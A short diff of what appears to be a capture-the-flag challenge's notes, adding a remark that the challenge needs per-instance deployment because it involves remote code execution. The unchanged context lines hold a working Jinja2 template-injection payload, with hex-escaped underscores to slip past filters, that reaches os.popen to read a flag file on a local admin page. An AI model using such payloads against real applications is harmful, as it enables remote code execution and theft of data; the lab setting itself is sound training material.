@@ -69,8 +69,6 @@ url=http%3a%2f%2f127.0.0.1%3a3000%2fadmin%3ftemplate%3dsendPayload(%22%7b%7b__im
 http%3A%2F%2Flocalhost%3A3000%2Fadmin?template={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /app/flag\x2etxt')|attr('read')()}}
 ```
 
+## Additional notes
 
-
-
-
-
+This NEEDS to be a per instance challenge since it involves RCE.
